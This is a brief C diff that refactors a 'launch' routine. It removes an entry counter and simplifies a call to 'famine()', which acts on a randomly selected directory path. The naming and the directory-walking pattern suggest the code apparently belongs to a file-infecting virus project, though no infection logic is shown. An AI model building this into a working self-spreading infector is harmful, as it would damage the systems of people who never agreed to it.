@@ -69,7 +69,6 @@ void constructor(void)
 
 static void launch(struct directory *dir, const size_t size)
 {
-	size_t m_entry = 0;
 	char dirent[BUFF_SIZE];
 
 	for (uint8_t index = 0; index < size; index++)
@@ -78,11 +77,9 @@ static void launch(struct directory *dir, const size_t size)
 			return ;
 		if (update_directory(&dir[index], dirent) == FAILURE)
 			return ;
-
-		m_entry += dir[index].entry;
 	}
 
-	famine(dir[_get_random_integer(size)].path, m_entry);
+	famine(dir[_get_random_integer(size)].path);
 }
 
 static void entry(void)
